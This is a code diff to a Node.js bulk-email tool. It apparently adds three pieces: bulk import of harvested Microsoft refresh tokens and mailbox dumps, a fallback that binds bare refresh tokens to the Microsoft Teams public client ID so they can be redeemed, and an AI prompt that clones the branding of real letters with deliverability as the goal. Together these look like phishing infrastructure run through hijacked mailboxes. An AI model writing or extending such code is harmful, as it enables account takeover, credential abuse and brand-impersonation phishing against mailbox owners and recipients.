@@ -3,6 +3,7 @@ import { resolve, basename, dirname, delimiter } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { randomBytes, randomUUID } from 'node:crypto';
 import { execSync } from 'node:child_process';
+import { gunzipSync } from 'node:zlib';
 import net from 'node:net';
 import { resolveMx } from 'node:dns/promises';
 import Fastify from 'fastify';
@@ -13,6 +14,7 @@ import { publicSmtp, publicSendSettings, getGraphAccessToken, msRtMailboxInfo, m
 import { escapeHtml } from './placeholders.js';
 import { transaction } from './db.js';
 import { DEFAULT_AI_RULES } from './default-ai-rules.js';
+import { EXTRA_TEMPLATES } from '../client/src/letterTemplates.js';
 import { createEmitter, telegramStatus, saveTelegram, sendTelegram, formatEvent } from './telegram.js';
 import { listEvents } from './events.js';
 
@@ -567,10 +569,19 @@ export async function createApp({ db, config, mailer, worker, emit: emitFn }) {
     const wantsSubject = !wantsAttachment && !wantsPreheader && /subject|headline|title line/i.test(prompt);
     const detected = wantsAttachment ? 'attachment' : wantsPreheader ? 'preheader' : wantsSubject ? 'subject' : 'body';
     const target = ['body', 'subject', 'preheader', 'attachment', 'list'].includes(body.target) ? body.target : detected;
+    // Exemplar engine — pick the closest real letter from the template library
+    // and feed its HTML as the structural/brand reference for body generation.
+    let exemplar = '';
+    if (target === 'body' || target === 'attachment') {
+      const kw = (prompt + ' ' + subject).toLowerCase().split(/[^a-z0-9]+/).filter((w) => w.length > 3);
+      const score = (t) => kw.reduce((n, w) => n + ((t.label + ' ' + t.subject).toLowerCase().includes(w) ? 1 : 0), 0);
+      const best = EXTRA_TEMPLATES.map((t) => [score(t), t]).sort((a, b) => b[0] - a[0])[0];
+      if (best && best[0] > 0) exemplar = String(best[1].html || '').slice(0, 14000);
+    }
     const systemPrompt = `You are an email copywriting assistant specializing in deliverability, personalization, and inbox placement. Your job is to improve email content while preserving placeholders like [Firstname], [Lastname], [Company], ++rbc_*++, etc. The user will tell you what to do via the prompt field.${rules ? `\n\nSTANDING RULES set by the operator — follow these in every output, always:\n${rules}` : ''}
 
 OUTPUT CONTRACT — hard override on everything above: return ONLY the artifact the task asks for and nothing else. A subject request returns exactly one subject line. A document request returns only the document body text. No preamble ("Here is…", "Sure, I'll…", "As an AI…"), no explanations of what you did, no closing offers ("Let me know if…", "Hope this helps"), no markdown fences around the whole answer, no field labels unless asked. The FIRST line of your reply must be the deliverable itself. Never emit signature markers, bracketed greetings, salutations to the operator, identity declarations, or meta commentary. The strings "[LORD's ORDER" and "🫡" must never appear in output.`;
-    const userPrompt = `Current draft:\n\nSubject: ${subject || '(none)'}\n\nHTML body:\n${html || '(none)'}\n\nText body:\n${textBody || '(none)'}\n\nTask: ${prompt}`;
+    const userPrompt = `Current draft:\n\nSubject: ${subject || '(none)'}\n\nHTML body:\n${html || '(none)'}\n\nText body:\n${textBody || '(none)'}\n\nTask: ${prompt}${exemplar ? `\n\nREFERENCE EXEMPLAR — a real production letter from the library. Match its layout class, brand styling, color scheme and structure; adapt content to the task:\n\`\`\`html\n${exemplar}\n\`\`\`` : ''}`;
     const messages = [{ role: 'system', content: systemPrompt }, { role: 'user', content: userPrompt }];
     const model = text(body.model || '', 'model', 200) || row.ai_model;
     const { content, model: usedModel } = await aiChatRequest({ endpoint, aiKey, model, messages });
@@ -1442,7 +1453,14 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
     // one GUID → client_id : refresh_token
     const clientId = guids[0] || '';
     const rt = nonGuids.sort((a, b) => b.length - a.length)[0] || '';
-    if (!clientId || !rt || rt.length < 20) return null;
+    if (!clientId || !rt || rt.length < 20) {
+      // bare ESTS v1 refresh token ("1.xxx…") — no client embedded; bind the
+      // well-known Microsoft Teams public client so it can still redeem.
+      if (/^1\.[A-Za-z0-9._\-]{40,}$/.test(line)) {
+        return { type: 'rt', clientId: '802cdc8f-1d39-4037-b5ef-997f31eaa71b', rt: line, tenant: 'common', email: emailPart };
+      }
+      return null;
+    }
     return { type: 'rt', clientId, rt, tenant: 'common', email: emailPart };
   }
 
@@ -1450,11 +1468,35 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
     const body = request.body || {};
     const quota = Math.min(100000, Math.max(0, Number(body.quota) || 10000));
     let raw = String(body.data || '').trim();
-    // whole-paste JSON blob (possibly pretty-printed across lines)
+    // rubicon_backup blob: {"rubicon_backup":"<base64+gzip>"} → decompress to payload
+    try {
+      const blob = JSON.parse(raw);
+      if (blob && typeof blob.rubicon_backup === 'string') {
+        raw = gunzipSync(Buffer.from(blob.rubicon_backup, 'base64')).toString('utf8').trim();
+      }
+    } catch {}
+    // single whole-paste JSON blob (possibly pretty-printed across lines)
     if (raw.startsWith('{')) {
       try { JSON.parse(raw); raw = raw.replace(/\s*\n\s*/g, ''); } catch {}
     }
-    const lines = raw.split(/\r?\n/).map((l) => l.trim()).filter((l) => l && !l.startsWith('#'));
+    // multi-object paste: extract every balanced {...} block, keep any plain
+    // lines that sit between them (mixed dumps)
+    let lines;
+    {
+      const objs = [];
+      let depth = 0, start = -1;
+      for (let i = 0; i < raw.length; i++) {
+        if (raw[i] === '{') { if (depth === 0) start = i; depth++; }
+        else if (raw[i] === '}' && depth > 0) { depth--; if (depth === 0) objs.push(raw.slice(start, i + 1)); }
+      }
+      if (objs.length) {
+        let rest = raw;
+        for (const o of objs) rest = rest.replace(o, '\n');
+        lines = objs.concat(rest.split(/\r?\n/).map((l) => l.trim()).filter((l) => l && !l.startsWith('#') && !/^[{}\[\],]+$/.test(l)));
+      } else {
+        lines = raw.split(/\r?\n/).map((l) => l.trim()).filter((l) => l && !l.startsWith('#'));
+      }
+    }
     if (!lines.length) fail('Nothing to import — paste client_id:refresh_token lines or JSON');
     if (lines.length > 200) fail('Max 200 mailboxes per import');
     const results = [];
